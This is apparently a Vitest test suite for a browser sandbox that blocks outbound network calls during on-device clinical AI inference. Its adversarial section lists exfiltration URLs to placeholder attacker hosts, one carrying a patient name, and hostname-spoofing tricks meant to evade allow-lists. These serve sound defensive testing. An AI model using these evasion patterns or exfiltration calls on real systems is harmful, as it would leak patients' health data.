import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';

// Import edge-ai-service to register window.NetworkIsolationGatekeeper and window.EdgeAIClinicalEngine
import '../../public/js/edge-ai-service.js';

describe('NetworkIsolationGatekeeper — Synchronous Zero-PHI Egress Sandbox', () => {
  let Gatekeeper;
  let originalFetch;
  let originalXHROpen;
  let originalXHRSend;
  let originalBeacon;
  let originalWebSocket;
  let originalEventSource;

  beforeEach(() => {
    Gatekeeper = window.NetworkIsolationGatekeeper;
    // Set up mock implementations for browser network APIs if not fully present in jsdom
    originalFetch = vi.fn(async (url) => ({ ok: true, status: 200, url }));
    window.fetch = originalFetch;

    originalXHROpen = vi.fn(function(method, url) { this._url = url; });
    originalXHRSend = vi.fn(function() { return 'xhr_sent'; });
    XMLHttpRequest.prototype.open = originalXHROpen;
    XMLHttpRequest.prototype.send = originalXHRSend;

    originalBeacon = vi.fn(() => true);
    navigator.sendBeacon = originalBeacon;

    originalWebSocket = vi.fn(function(url) { this.url = url; });
    window.WebSocket = originalWebSocket;

    originalEventSource = vi.fn(function(url) { this.url = url; });
    window.EventSource = originalEventSource;

    // Reset lock state before each test
    Gatekeeper.unlock();
  });

  afterEach(() => {
    Gatekeeper.unlock();
    vi.restoreAllMocks();
  });

  it('locks network and blocks external fetch with SECURITY_EXCEPTION', async () => {
    Gatekeeper.lock();
    expect(Gatekeeper.isLocked).toBe(true);

    await expect(
      window.fetch('https://api.openai.com/v1/chat/completions')
    ).rejects.toThrow(/SECURITY_EXCEPTION: Outbound network transmissions blocked/);

    expect(originalFetch).not.toHaveBeenCalled();
  });

  it('permits internal relative paths, localhost, and Firebase endpoints during active lock', async () => {
    Gatekeeper.lock();

    // 1. Relative paths
    await expect(window.fetch('/api/v1/patients')).resolves.toBeDefined();
    await expect(window.fetch('./assets/logo.png')).resolves.toBeDefined();
    await expect(window.fetch('../styles/theme.css')).resolves.toBeDefined();

    // 2. Localhost
    await expect(window.fetch('http://localhost:3000/api/status')).resolves.toBeDefined();
    await expect(window.fetch('http://127.0.0.1:8080/data')).resolves.toBeDefined();

    // 3. Authorized Firebase endpoints
    await expect(window.fetch('https://firestore.googleapis.com/v1/projects/imc-er-manager/databases')).resolves.toBeDefined();
    await expect(window.fetch('https://identitytoolkit.googleapis.com/v1/accounts')).resolves.toBeDefined();
    await expect(window.fetch('https://imc-er-manager.firebaseio.com/live.json')).resolves.toBeDefined();

    expect(originalFetch).toHaveBeenCalledTimes(8);
  });

  it('blocks external XMLHttpRequest and captures URL via open interceptor', () => {
    Gatekeeper.lock();

    const xhrExternal = new XMLHttpRequest();
    xhrExternal.open('POST', 'https://malicious-telemetry.io/collect');
    expect(() => xhrExternal.send(JSON.stringify({ phi: 'patient data' }))).toThrow(
      /SECURITY_EXCEPTION: Outbound XHR transmissions blocked/
    );

    const xhrInternal = new XMLHttpRequest();
    xhrInternal.open('GET', '/api/patients/list');
    expect(() => xhrInternal.send()).not.toThrow();
  });

  it('blocks external sendBeacon and returns false without throwing', () => {
    Gatekeeper.lock();

    const blockedResult = navigator.sendBeacon('https://external-tracker.com/event', JSON.stringify({ p: 1 }));
    expect(blockedResult).toBe(false);
    expect(originalBeacon).not.toHaveBeenCalled();

    const allowedResult = navigator.sendBeacon('/telemetry/local', JSON.stringify({ p: 1 }));
    expect(allowedResult).toBe(true);
    expect(originalBeacon).toHaveBeenCalled();
  });

  it('blocks external WebSocket initialization during active lock', () => {
    Gatekeeper.lock();

    expect(() => new window.WebSocket('wss://external-streaming-leak.org/feed')).toThrow(
      /SECURITY_EXCEPTION: Outbound WebSocket connections blocked/
    );

    expect(() => new window.WebSocket('ws://localhost:3000/ws')).not.toThrow();
  });

  it('blocks external EventSource initialization during active lock', () => {
    Gatekeeper.lock();

    expect(() => new window.EventSource('https://external-sse.com/stream')).toThrow(
      /SECURITY_EXCEPTION: Outbound EventSource connections blocked/
    );

    expect(() => new window.EventSource('/api/sse/internal')).not.toThrow();
  });

  it('records security violations in TelemetryRUM when blocked calls occur', async () => {
    const recordSecurityViolation = vi.fn();
    window.TelemetryRUM = { recordSecurityViolation };

    Gatekeeper.lock();

    try {
      await window.fetch('https://exfiltration-target.com/leak');
    } catch (_) {}

    expect(recordSecurityViolation).toHaveBeenCalledWith({
      action: 'blocked_fetch_during_phi_inference',
      url: 'https://exfiltration-target.com/leak'
    });

    try {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', 'https://exfiltration-target.com/xhr');
      xhr.send();
    } catch (_) {}

    expect(recordSecurityViolation).toHaveBeenCalledWith({
      action: 'blocked_xhr_during_phi_inference',
      url: 'https://exfiltration-target.com/xhr'
    });

    delete window.TelemetryRUM;
  });

  it('restores all original unpatched network functions upon unlock()', async () => {
    Gatekeeper.lock();
    expect(Gatekeeper.isLocked).toBe(true);

    Gatekeeper.unlock();
    expect(Gatekeeper.isLocked).toBe(false);

    expect(window.fetch).toBe(originalFetch);
    expect(XMLHttpRequest.prototype.open).toBe(originalXHROpen);
    expect(XMLHttpRequest.prototype.send).toBe(originalXHRSend);
    expect(navigator.sendBeacon).toBe(originalBeacon);
    expect(window.WebSocket).toBe(originalWebSocket);
    expect(window.EventSource).toBe(originalEventSource);

    // Unlocked fetch to external URL succeeds through originalFetch
    await window.fetch('https://api.external.com');
    expect(originalFetch).toHaveBeenCalledWith('https://api.external.com');
  });

  it('handles reentrant lock() and unlock() calls idempotently', () => {
    Gatekeeper.lock();
    const patchedFetch1 = window.fetch;
    // Second lock call should be a no-op
    Gatekeeper.lock();
    expect(window.fetch).toBe(patchedFetch1);

    Gatekeeper.unlock();
    expect(Gatekeeper.isLocked).toBe(false);
    expect(window.fetch).toBe(originalFetch);

    // Second unlock call should be a safe no-op
    expect(() => Gatekeeper.unlock()).not.toThrow();
  });

  it('guarantees sandbox unlock in EdgeAIClinicalEngine when an error occurs', async () => {
    const Engine = window.EdgeAIClinicalEngine;
    vi.spyOn(Engine, 'checkCapabilities').mockRejectedValue(new Error('Simulated NPU driver crash'));

    const patient = { id: 'p1', name: 'Omar Khaled' };

    await expect(Engine.generateDischargeSummary(patient)).rejects.toThrow('Simulated NPU driver crash');

    // Network sandbox must be completely unlocked
    expect(Gatekeeper.isLocked).toBe(false);
    expect(window.fetch).toBe(originalFetch);
  });

  describe('Adversarial Sandbox Bypass & Evasion Attack Vectors', () => {
    it('blocks query parameter injection spoofing authorized hostnames', async () => {
      Gatekeeper.lock();

      const queryAttackUrls = [
        'https://evil.com/leak?target=firestore.googleapis.com',
        'https://attacker.org/exfil?dest=identitytoolkit.googleapis.com',
        'https://c2-server.net/log?ref=localhost',
        'https://malicious.io/data?host=127.0.0.1',
        'https://evil.com/api?endpoint=imc-er-manager.firebaseio.com'
      ];

      for (const url of queryAttackUrls) {
        expect(Gatekeeper._isExternalRequest(url)).toBe(true);
        await expect(window.fetch(url)).rejects.toThrow(/SECURITY_EXCEPTION: Outbound network transmissions blocked/);
      }
      expect(originalFetch).not.toHaveBeenCalled();
    });

    it('blocks subdomain spoofing and suffix spoofing attacks', async () => {
      Gatekeeper.lock();

      const subdomainAttackUrls = [
        'https://firestore.googleapis.com.evil.com/data',
        'http://localhost.evil.com/leak',
        'http://127.0.0.1.attacker.net/exfil',
        'https://identitytoolkit.googleapis.com.malicious.io/collect',
        'https://evilfirebaseio.com/leak',
        'https://fake-firebaseio.com/data'
      ];

      for (const url of subdomainAttackUrls) {
        expect(Gatekeeper._isExternalRequest(url)).toBe(true);
        await expect(window.fetch(url)).rejects.toThrow(/SECURITY_EXCEPTION: Outbound network transmissions blocked/);
      }
      expect(originalFetch).not.toHaveBeenCalled();
    });

    it('blocks path spoofing containing authorized domain names', async () => {
      Gatekeeper.lock();

      const pathAttackUrls = [
        'https://evil.com/localhost/data',
        'https://evil.com/127.0.0.1/exfil',
        'https://evil.com/firestore.googleapis.com/v1/leak',
        'https://attacker.org/identitytoolkit.googleapis.com/auth'
      ];

      for (const url of pathAttackUrls) {
        expect(Gatekeeper._isExternalRequest(url)).toBe(true);
        await expect(window.fetch(url)).rejects.toThrow(/SECURITY_EXCEPTION: Outbound network transmissions blocked/);
      }
      expect(originalFetch).not.toHaveBeenCalled();
    });

    it('blocks protocol-relative URL evasion attempts', async () => {
      Gatekeeper.lock();

      const protocolRelativeUrls = [
        '//evil.com/leak',
        '//attacker.org/exfiltrate',
        '//firestore.googleapis.com.evil.com/data'
      ];

      for (const url of protocolRelativeUrls) {
        expect(Gatekeeper._isExternalRequest(url)).toBe(true);
        await expect(window.fetch(url)).rejects.toThrow(/SECURITY_EXCEPTION: Outbound network transmissions blocked/);
      }
      expect(originalFetch).not.toHaveBeenCalled();
    });

    it('blocks window.fetch when passed a URL object or Request object pointing to an external destination', async () => {
      Gatekeeper.lock();

      // 1. URL object pointing to external attacker
      const externalUrlObj = new URL('https://evil-exfil-c2.org/leak?phi=OmarKhaled');
      await expect(
        window.fetch(externalUrlObj)
      ).rejects.toThrow(/SECURITY_EXCEPTION: Outbound network transmissions blocked/);

      // 2. Request-like object pointing to external attacker
      const externalRequestObj = { url: 'https://attacker.com/phi-stream', method: 'POST' };
      await expect(
        window.fetch(externalRequestObj)
      ).rejects.toThrow(/SECURITY_EXCEPTION: Outbound network transmissions blocked/);

      expect(originalFetch).not.toHaveBeenCalled();
    });

    it('permits window.fetch when passed a URL object pointing to an authorized Firebase endpoint', async () => {
      Gatekeeper.lock();

      const authorizedUrlObj = new URL('https://firestore.googleapis.com/v1/projects/imc-er-manager/databases');
      await expect(window.fetch(authorizedUrlObj)).resolves.toBeDefined();
      expect(originalFetch).toHaveBeenCalledWith(authorizedUrlObj);
    });
  });

  it('blocks external requests passing URL or Request objects to window.fetch during lock', async () => {
    Gatekeeper.lock();

    // 1. URL instance
    const externalUrlObj = new URL('https://evil-exfil-c2.org/leak?phi=test');
    await expect(window.fetch(externalUrlObj)).rejects.toThrow(/SECURITY_EXCEPTION/);

    // 2. Request object-like structure
    const requestLike = { url: 'https://evil-exfil-c2.org/leak', method: 'POST' };
    await expect(window.fetch(requestLike)).rejects.toThrow(/SECURITY_EXCEPTION/);

    // 3. Permitted local URL object
    const internalUrlObj = new URL('http://localhost:3000/api/patients');
    await expect(window.fetch(internalUrlObj)).resolves.toBeDefined();
  });

  it('rejects protocol-relative URLs and keyword spoofing in _isExternalRequest', () => {
    // Protocol-relative URLs
    expect(Gatekeeper._isExternalRequest('//evil.com/leak')).toBe(true);
    expect(Gatekeeper._isExternalRequest('//firestore.googleapis.com.attacker.com')).toBe(true);

    // Query and path spoofing
    expect(Gatekeeper._isExternalRequest('https://evil.com/collect?dest=firestore.googleapis.com')).toBe(true);
    expect(Gatekeeper._isExternalRequest('https://evil.com/localhost/exfil')).toBe(true);
    expect(Gatekeeper._isExternalRequest('https://evil-firebaseio.com/data')).toBe(true);

    // Malformed strings fail-closed
    expect(Gatekeeper._isExternalRequest('http://[invalid-ipv6-bracket')).toBe(true);
  });
});
